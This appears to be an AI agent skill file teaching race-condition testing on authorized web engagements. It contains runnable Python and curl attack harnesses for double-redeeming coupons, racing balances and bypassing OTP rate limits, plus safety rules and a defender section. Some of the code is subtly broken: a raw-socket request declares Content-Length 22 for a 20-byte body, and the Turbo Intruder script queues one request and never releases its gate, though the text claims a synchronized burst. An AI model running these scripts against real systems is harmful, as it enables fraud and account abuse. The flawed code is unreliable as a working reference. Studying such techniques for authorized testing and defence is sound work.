---
name: race-conditions
description: Use when testing for race conditions (time-of-check to
  time-of-use flaws) on an authorized engagement. Covers finding single-use or
  limited-quantity endpoints (coupons, credits, rate limits, email change,
  password reset), sending parallel requests with Python 3.12 threads and Burp
  Suite Turbo Intruder single-packet attacks, last-byte synchronization, and
  measuring outcomes without causing real damage. Use when business logic
  enforces limits that might break under concurrent requests, or when
  sequential tests behave correctly but parallel ones might not.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [webapp-pentest-methodology, auth-attacks]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

A race condition happens when the application checks a limit and then acts
on it, but two requests slip through the gap between the check and the
action. One coupon redeemed twice, one password reset token used in
parallel, one rate limit bypassed by fifty simultaneous requests: the
logic is correct for sequential traffic and wrong for concurrent traffic.
This skill covers the authorized methodology: finding race candidates,
firing synchronized parallel requests, measuring the outcome, and keeping
the test safe. All testing targets systems you have written permission to
test. Race tests move real state, so use dedicated test accounts, keep the
blast radius small, and coordinate with the client on what may be mutated.

## Quick Workflow

1. List state-changing endpoints with limits: coupon redemption, credit
   or balance changes, single-use tokens, email or password changes,
   voting, and rate-limited actions.
2. Baseline each candidate sequentially: confirm the limit works when
   requests arrive one at a time.
3. Build a parallel sender (Python threads or Burp Turbo Intruder) that
   fires 10 to 50 identical requests as simultaneously as possible.
4. Measure the outcome: balances, redemption counts, and response codes
   after the burst.
5. If the burst shows no flaw, retry with tighter synchronization
   (single-packet attack, last-byte sync) before moving on.
6. Reproduce the finding cleanly: reset the test account, fire once
   more, capture the evidence.
7. Clean up test state and record the exact request count, timing, and
   observed over-redemption for the report.

## 1. Finding race candidates

Look for any endpoint where the same action must not happen twice, or
must not exceed a quantity. Good hunting grounds:

- Coupon, voucher, or promo code redemption.
- Adding credit, withdrawing, transferring, or refunding money or
  points.
- Password reset tokens and email change confirmations.
- One-vote-per-user polls and limited-stock purchases.
- Rate-limited endpoints (login attempts, OTP verification).
- Applying a discount, or stacking two discounts.

```bash
# Baseline the coupon flow sequentially first (limit must work serially)
for i in 1 2 3; do
  curl -s -b 'session=YOUR_TEST_SESSION' -X POST \
    'https://target.example/api/coupon/redeem' \
    -H 'Content-Type: application/json' \
    -d '{"code":"WELCOME10"}' | head -c 200
  echo
done
```

If the second sequential attempt is already accepted, you have a plain
logic bug, not a race. Only proceed to parallel testing when sequential
behavior is correct.

## 2. Parallel requests with Python threads

The simplest race harness: N threads firing the same request, released
by a barrier so they start within microseconds of each other.

```python
#!/usr/bin/env python3
"""Thread-barrier race harness (authorized targets only)."""
import threading, urllib.request, json

URL = "https://target.example/api/coupon/redeem"
COOKIE = "session=YOUR_TEST_SESSION"
N = 20
barrier = threading.Barrier(N)
results = []

def fire(_):
    barrier.wait()  # all threads start together
    req = urllib.request.Request(
        URL,
        data=json.dumps({"code": "WELCOME10"}).encode(),
        headers={"Content-Type": "application/json",
                 "Cookie": COOKIE})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            results.append((r.status, r.read()[:120]))
    except Exception as e:
        results.append(("ERR", str(e)[:80]))

threads = [threading.Thread(target=fire, args=(i,)) for i in range(N)]
for t in threads: t.start()
for t in threads: t.join()
ok = sum(1 for s, _ in results if s == 200)
print(f"{ok}/{N} requests returned 200")
for s, body in results[:5]:
    print(s, body)
```

```bash
# Measure the account state before and after the burst
curl -s -b 'session=YOUR_TEST_SESSION' \
  'https://target.example/api/account' | python3 -c \
  "import json,sys; d=json.load(sys.stdin); print('balance:', d.get('balance'), 'coupons:', d.get('coupons'))"
```

If 20 parallel requests redeem a single-use coupon 7 times, the race is
confirmed. Compare against the balance or count endpoint, not just
status codes: some applications return 200 for every attempt but only
apply one, which is not a finding.

## 3. Single-packet attack with Turbo Intruder

Thread barriers still serialize at the network layer. The single-packet
attack (Burp Turbo Intruder) holds back the final bytes of each request
so all requests complete in one TCP packet window, arriving at the
server effectively simultaneously.

```python
# Turbo Intruder script (Burp Suite 2026.2 Extensions tab)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False)
    # %s placeholder: engine waits, then releases all at once
    engine.queue(target.req, gate='race1')

def handleResponse(req, interesting):
    table.add(req)
```

```bash
# In Repeater, craft the request, then send to Turbo Intruder.
# Append the gate marker so all queued requests fire together:
# POST /api/coupon/redeem HTTP/1.1 ... (body ends normally)
# The engine holds the last byte of every connection, then releases.
```

In practice: queue 20 to 30 copies of the request with the same gate
name, and Turbo Intruder releases them in a single burst. This defeats
application-level locks that thread-based bursts cannot, because the
requests genuinely overlap inside the server's request handling.

## 4. Last-byte synchronization over raw sockets

When Turbo Intruder is unavailable, raw sockets with a shared release
event approximate the single-packet attack from Python.

```python
#!/usr/bin/env python3
"""Last-byte sync race over raw TLS sockets (authorized targets only)."""
import socket, ssl, threading

HOST = "target.example"
N = 20
release = threading.Event()
results = []
TEMPLATE = (
    "POST /api/coupon/redeem HTTP/1.1\r\nHost: target.example\r\n"
    "Content-Type: application/json\r\nCookie: session=YOUR_TEST_SESSION\r\n"
    "Content-Length: 22\r\nConnection: close\r\n\r\n"
    '{"code":"WELCOME10"}'
)
head, last = TEMPLATE[:-1], TEMPLATE[-1:]

def fire(_):
    s = ssl.create_default_context().wrap_socket(
        socket.create_connection((HOST, 443), timeout=10),
        server_hostname=HOST)
    s.sendall(head.encode())   # everything except the last byte
    release.wait()              # wait for the starter pistol
    s.sendall(last.encode())    # final byte completes all requests at once
    try:
        results.append(s.recv(200))
    except Exception as e:
        results.append(str(e).encode())
    s.close()

threads = [threading.Thread(target=fire, args=(i,)) for i in range(N)]
for t in threads: t.start()
release.set()                  # fire all at once
for t in threads: t.join()
print(f"got {len(results)} responses")
print(b"\n".join(r.split(b"\r\n")[0] for r in results[:5]))
```

Pre-connecting every socket before the release removes TLS handshake
jitter from the timing. This is the closest pure-Python approximation
of the single-packet attack.

## 5. Measuring and confirming the outcome

Status codes lie; state does not. After each burst, query the
authoritative state and diff it against the pre-burst value.

```bash
# Coupon case: count redemptions in the account or order history
curl -s -b 'session=YOUR_TEST_SESSION' \
  'https://target.example/api/coupons/used' | grep -o 'WELCOME10' | wc -l

# Balance case: compare before and after
# (capture BEFORE value, run burst, capture AFTER, compute delta)

# OTP / rate limit case: did N parallel wrong guesses all get evaluated
# instead of locking the account after 5?
for i in $(seq 1 3); do
  curl -s -o /dev/null -w '%{http_code}\n' \
    -b 'session=YOUR_TEST_SESSION' -X POST \
    'https://target.example/api/otp/verify' \
    -H 'Content-Type: application/json' -d '{"code":"000000"}'
done
```

A clean reproduction: reset the test account to a known state, run one
burst, and capture the before/after state plus five sample responses.
That bundle is the report evidence. Run the burst two or three times;
race windows are timing-dependent and a single success among failures
still counts, but consistency strengthens the finding.

## 6. Staying inside safe bounds

Race tests mutate real state, so agree on boundaries before firing:

- Use dedicated test accounts the client provisioned, never real users.
- Prefer low-value actions: a 10 percent test coupon, not a full
  refund flow. If only high-value flows exist, demonstrate with the
  smallest burst that proves the window (often 5 requests suffice).
- Never race destructive actions (account deletion, data wipes) or
  actions that notify real people (emails, SMS, charges).
- Cap the burst size: start at 10, raise to 30 only if the server
  clearly serializes smaller bursts.
- Space out attempts so you do not look like a denial of service
  attack, and stop if the application slows for other users.
- Clean up: reverse test redemptions or ask the client to reset the
  test account when you are done.

## Edge cases

- The application runs on multiple servers behind a load balancer:
  bursts may land on different nodes with separate in-memory state,
  which both hides and amplifies races. Pin to one node if the
  engagement allows (via a header or direct IP), and test both ways.
- Database transactions serialize the critical section: the race
  window may be microseconds wide, so only the single-packet attack
  reaches it.
- Idempotency keys defeat naive replays: each request needs a fresh
  key, so generate N keys and race those.
- The limit is enforced asynchronously (a queue or cron job): the
  burst always succeeds and the correction happens later. Check state
  after the async job runs before claiming a finding.
- Rate limiting counts the burst as abuse and bans the test IP:
  coordinate allowlisting with the client first.
- The application deduplicates by request body hash: vary a nonce
  field per request while keeping the semantic action identical.

## Escalation

- Thread bursts show nothing: move to the single-packet attack in
  section 3, then to last-byte sync in section 4.
- Single endpoint resists: race two different endpoints that touch the
  same balance (redeem coupon while withdrawing credit).
- The window is tiny: shrink the request (minimal headers) so more
  requests fit inside it, and raise concurrency to 50.
- Server-side locks serialize everything: test whether the lock is
  per-user or global by racing with two different test accounts at
  once; a per-user lock still allows cross-user races on shared
  resources like limited stock.
- No state change is directly visible: look for second-order effects
  (emails sent, audit log entries, webhook calls) that reveal double
  execution.

## Detection and defender view

Defenders see race attacks as clusters of identical state-changing
requests from one session arriving within milliseconds, duplicate
redemptions or balance movements in audit logs, and idempotency or
uniqueness constraint violations spiking in database logs. The durable
fixes are database-level atomicity (unique constraints, conditional
updates like `SET balance = balance - x WHERE balance >= x`), pessimistic
locking or compare-and-swap on the critical section, and idempotency
keys for retried operations. Application-level locks in a single process
do not survive multi-server deployments, so the fix must live in the
shared data store.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the entry
  point class.
- CWE-362 (Concurrent Execution using Shared Resource with Improper
  Synchronization, Race Condition).
- CWE-367 (Time-of-check Time-of-use Race Condition).
- PortSwigger research on race conditions and the single-packet attack
  technique.
- PortSwigger Web Security Academy: race condition labs.
- Burp Suite 2026.2 documentation: Turbo Intruder extension and
  request engine gating.
